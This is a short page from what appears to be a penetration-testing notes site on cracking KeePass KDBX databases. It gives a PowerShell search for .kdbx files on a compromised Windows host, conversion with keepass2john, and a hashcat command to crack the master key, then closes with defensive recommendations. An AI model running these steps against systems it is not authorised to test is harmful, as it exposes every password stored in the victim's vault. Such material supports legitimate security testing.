---
layout: default
title: KDBX
parent: Cracking
nav_order: 1
permalink: /cracking/kdbx/
---

# KDBX
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

KDBX format is the second version (KDB in version 1) for an encrypted database that contains passwords. This database is generally encrypted with a master key. If you gain access to a computer, try to find `.kdb[x]` file on the system. Then, transfer it to your Kali and convert it with `keepass2john` to then crack the master key with `hashcat`. If you manage to crack it, you'll gain access to all passwords stored in the database.

## Prerequisites

* KDBX file can be exported on your Kali.

## Exploit

```bash
# Locate .kdbx files on a Windows system.
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Transfer the .kdbx file on your Kali and convert it.
keepass2john Database.kdbx > keepass.hash

# Crack it with hashcat (13400 corresponds to KDBX database format).
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## Recommendations

- [ ] Enforce strong master key on KDBX file.
- [ ] Use passwordless authentication method to secure KDBX file like FIDO 2 key.